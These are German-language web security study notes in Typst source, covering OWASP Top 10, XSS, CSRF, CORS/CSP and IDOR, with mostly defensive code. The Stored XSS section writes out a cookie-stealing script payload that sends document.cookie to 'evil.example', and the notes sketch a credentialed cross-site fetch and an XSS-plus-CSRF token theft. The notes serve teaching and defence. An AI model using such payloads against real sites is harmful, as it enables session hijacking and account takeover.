#import "../template--additional-formatting-templates.typ": *

= security
<security>

== Security Mindset
- Vertraue niemals User-Input
- Alles vom Client kann manipuliert werden
- Der Server entscheidet
- Security braucht mehrere Schutzschichten
«Security bedeutet: nicht nur bauen — sondern hinterfragen.»

= Login und Passwort Management
- UX: Re-Authentication (Passwort bestätigen) und Bestätigungs-Dialog vor irreversiblen Aktionen #hinweis[für Security und gutes Design]
- Login selber bauen fast immer schlechte Idee, nutze existierende Dienste (Auth0, Firebase Auth...) oder Passwortlos (Magic Link, Passkey).
- schlechte UX = Passwort-Reuse, Fehler #sym.arrow.r Frust #sym.arrow.r Workarounds.

== Sign-up Form Best Practices
// https://web.dev/sign-in-form-best-practices/
/ Nutze den Browser: richtige HTML-Elemente #hinweis[`<form>, <label>, <button>`], "type, required, autocomplete" nutzen.
/ Passwort UX richtig machen: Browser Password Manager nutzen, `autocomplete="new-password"/"current-password"`, `Show password` anbieten
/ Reduziere «Friction»: keine doppelte Eingabe (Email / Passwort), klare Fehlermeldungen, Passwortregeln klar anzeigen
/ Mobile First & Accessibility: Grosse Inputs und Buttons, Jedes Feld mit `<label>`

== Cookies - ermöglichen Authentication nicht Autorisation
*Wichtige Cookie Optionen:*
_httpOnly_ #sym.arrow.r Cookie nicht via JS zugreifbar,
_secure_ #sym.arrow.r nur über https gesendet,
_sameSite_: Lax (default, gesendet bei same-site + top-level Navigation/GET); None (immer), [strict],
_maxAge/expires_: Lebensdauer

= OWASP Top 10
/ A01-2025: Broken Access Control (_IDOR_, _CSRF_)
/ A02-2025: Security Misconfiguration
/ A03-2025: Software Supply Chain Failures (Vulnerabel & Outdated Components #sym.arrow.r NPM)
/ A04-2025: Cryptographic Failures (2017: Sensitive Data Exposure)
/ A05-2025: Injection: Cross-Site-Scripting (_XSS_), JS Code Injection, SQL Injection
/ A06-2025: Insecure Design (#sym.arrow.r Meine Impfungen: Nicht gesetzeskonforme und überwindbare Legitimationsprüfung (Brute-Force + _IDOR_ + _CSRF_ + _XSS_))

== Angriffe kurzgefasst
/ XSS: → Wird User-Input zu Code? _Lösung_: Output immer escapen. React escaped automatisch — dangerouslySetInnerHTML vermeiden.
/ IDOR: → Wird jeder Zugriff serverseitig geprüft? _Lösung_: Authentication (wer bist du?) + Authorization (darfst du das?) — beide serverseitig.
/ CSRF: → Wer hat diesen Request wirklich ausgelöst? _Lösung_: CSRF-Token verwenden. Keine State Changes via GET

== Sicherheitsmassnahmen
#v(-1em)
==== Content Security Policy (CSP)
CSPs ermöglichen die Ausführung von bösartigem Code auf Webseiten zu verhindern. Quellen von Ressourcen
(Skripten, Bilder etc.) können eingeschränkt werden. CSPs werden im HTTP
Header definiert

==== CORS
/ SOP: Same-Origin-Policy erlaubt XMLHttpRequest nur zur Origin.
/ CORS: (Cross Origin Resource Sharing) : Browser entscheidet ob Response für JS zugänglich ist, #hinweis[nutze Access-Control-Allow-Origin, steuere SOP]. // mit CORS fetch request zu gewissen domains erlaubt aber inhalt wird nicht gezeigt. standardmässig nur eigene domain erlaubt.
Nicht verwechseln mit CSP: Content Security Policy (CSP) begrenzt, was der Browser laden und ausführen darf → reduziert Schaden bei XSS (aber ersetzt kein Escaping) // z.B. ob inline js ausgeführt werden darf oder .js dateien von welchen domains erlaubt sind https://stackoverflow.com/questions/39488241/what-is-the-difference-between-cors-and-csps
/ Cross-Origin Resource Sharing: Mechanismus um Cross-Site-Requests zu ermöglichen, Der Ziel-Server kann dem Client den Zugriff erlauben, Wird vom Browser Enforced

// ==== Cross-Origin Resource Sharing (CORS)
// CORS Header ermöglichen Ressourcen (wie z.B. Bilder, Skripte oder Daten) von einem anderen Ursprungsort als der eigenen “Origin” zu laden.












== XSS
#v(-1em)
==== Angriffs-Szenario (Stored XSS)
/ Setze user-input auf: `<script>document.body.insertAdjacentHTML('afterbegin','<p style="color:red">HACKED</p>')</script>` oder `<script>fetch('https://evil.example?c='+document.cookie)</script>`
/ Server macht: ```js .map(u => `<li>${u.name} (ID:${u.id})</li>\`)```
/ Besonders gefährlich: weil alle Nutzer die auf diese Seite zugreifen, angegriffen werden.
/ Was Angreifer machen kann: DOM auslesen, Requests im Namen des Nutzers senden, Tokens oder Daten abgreifen, Aktionen im Account des Nutzers durchführen

==== Stored XSS Schutz
1. *Output Escaping*: #strike[```js`${input}```], ```js ${xss(input)}```, ```js {input} ```, #strike[```js {{{input}}// hbs```],```js {{input}}// hbs```, #hinweis[Zeichen als Text rendern]
// React escaped automatisch
2. *Sanitizing von Benutzerinput* (Zeichen entfernen) *beim Speichern* ```js xss(input) ```
3. Keine direkte Einbettung von ungeprüften Daten in HTML


Weitere XSS Gegenmassnahmen:
- *Content Security Policy* (CSP): blockiert Script-Ausführung im Browser + Server sendet Info im Seiten-Header. Z.B. mit "Helmet" `app.use(helmet.contentSecurityPolicy({...}))`. CSP = wohin der Browser (Fetch)-Requests senden darf.
- *HttpOnlyCookies*: Statt JWT im localStorage / sessionStorage
    #v(-0.5em)
    ```js
    res.cookie('session', token, {
        httpOnly: true, // nicht via document.cookie lesbar
        secure: true, // nur über HTTPS
        sameSite: 'lax' // CSRF-Schutz
    });
    ```

== CSRF Cross-Site Request Forgery
#v(-1em)
==== Angriffs-Szenario CSRF-Token
1. Nutzer ist eingeloggt (Session aktiv)
2. Nutzer besucht eine fremde Seite (Attacker)
3. Diese Seite sendet (POST-Request, Form-Submit, fetch) an unsere App
4. Browser sendet _automatisch_ das Session-Cookie mit
5. Server führt die Aktion aus (denkt: legitimer Nutzer)
#sym.arrow.r Cookie und so gültig, da Nutzer es (unfreiwillig) ausführte.
/ Warum?: Cookies werden automatisch für passende Domains mitgeschickt, um Sessions zu
ermöglichen. Der Server vertraut darauf, dass der Request legitim ist.
/ Schutz: CSRF-Token und SameSite Cookies
/ Ursache: CSRF nutzt das Vertrauen des Servers in Cookies aus.  Der Server prüft nicht die Herkunft des Requests.

==== Angriffs-Szenario CORS und CSRF-Token
1. User nutzt app.example.com mit Daten von api.example.com.
2. Nutzer öffnet aus Versehen evil.com im Browser
3. evil.com Seite versucht request: `fetch("https://api.example.com/user", {credentials: "include"}) // Cookies mitgesendet`

==== CSRF Schutz
/ CSRF Token: Server prüft ob Request aus eigener App, wenn kein CSRF-Token vorhanden wird Anfrage abgelehnt. Schützt vor: Form-submit und fetch CSRF Angriff.
/ Keine State Changes: vorallem nicht via GET.
/ CORS: verhindert CSRF nicht!
/ SameSite Cookie: `Set-Cookie: session=...; SameSite=Lax`. Das reduziert das Risiko, schützt aber nicht vollständig, insbesondere bei bestimmten Navigationen

#v(-0.5em)
```html
// Formular (Client)
<form method="POST" action="/change-email">
    <input name="email" />
    <input type="hidden" name="csrfToken" value="{{token}}" />
    <button>Save</button>
</form>
```
```js
// Server (Express Form-Handling)
app.post('/change-email', (req, res) => {
    if (req.body.csrfToken !== session.csrfToken) {
        return res.status(403).send("Forbidden");
    }
    email = req.body.email;
    res.send("OK");
});
```

== Kombination XSS und CSRF
- Server hat CSRF-Token implementiert.
1. Ein Angreifer speichert schädlichen Code (XSS) im Profilnamen
2. Ein Opfer öffnet die Seite
3. Das Script wird im Browser des Opfers ausgeführt
4. Das Script liest den CSRF-Token aus dem DOM
5. Das Script sendet einen POST-Request an /change-email mit gültigem Token
6. Der Server akzeptiert den Request

/ Warum besonders kritisch?:
    Er kombiniert zwei Schwachstellen und umgeht den Schutz vollständig.
    Der Angriff erfolgt im Kontext der Anwendung und ist daher für den Server nicht
    unterscheidbar
/ "XSS schlägt CSRF" bedeutet:
    Wenn ein Angreifer JavaScript im Browser ausführen kann, kann er auch CSRF-
    Token verwenden und beliebige Aktionen ausführen.
/ XSS: läuft im Kontext der Anwendung und kann deshalb CSRF-Schutz umgehen. Besonders kritisch da es andere Schutzmechanismen umgehen kann und direkten Zugriff auf Browser-Kontext ermöglicht.

== IDOR (Broken Access Control)
#v(-1em)
==== Angriffs-Szenario
// Der Angreifer loggt sich ein und manipuliert die URL der StockPortfolio Seite von
// `www.retireEasy.com/stockportfolio/:attackerUID` zu `www.retireEasy.com/stockportfolio/:victimUID`.  Diese Seite wird angezeigt.
1. Du rufst dein eigenes Dokument auf
2. Du änderst die ID in der URL
3. Du erhältst Zugriff auf fremde Dokumente
*Problem:* Der Server prüft nicht, ob das Dokument dem eingeloggten Nutzer gehört.
- Das Problem liegt im Backend, Frontend kann es nicht zuverlässig verhindern.
- IDOR bedeutet fehlende Autorisierung. Der Server muss immer prüfen, ob ein Zugriff erlaubt ist.
- Object-level Authorization-Check: Gehört das Objekt dem aktuellen User?

==== IDOR Schutz
```js
app.get('/api/documents/:id', async (req, res) => {
    const doc = await db.getDocument(req.params.id);
    if (!doc || doc.ownerId !== req.session.userId) {
            return res.status(404).json({}); // Enumeration verhindern
    } res.json(doc);
});
```

/*
Middleware Funktion welche sicher stellt, dass Nutzer eingelogged sind (authentisiert und autorisiert)
function requireLogin(req, res, next) {
if (typeof(req.session.user_id) == "number") &&
user.isAuthorized(req.session.user_id, req.url) {
next();
} else {
res.send(404, 'not found'); // eigentlich 401 aber…
}
}
Middleware Route Definition für den geschützten Bereich
app.all("/api/*", requireLogin, function(req, res, next) {
next(); // if the middleware allowed us to get here, just move on
});
*/ */
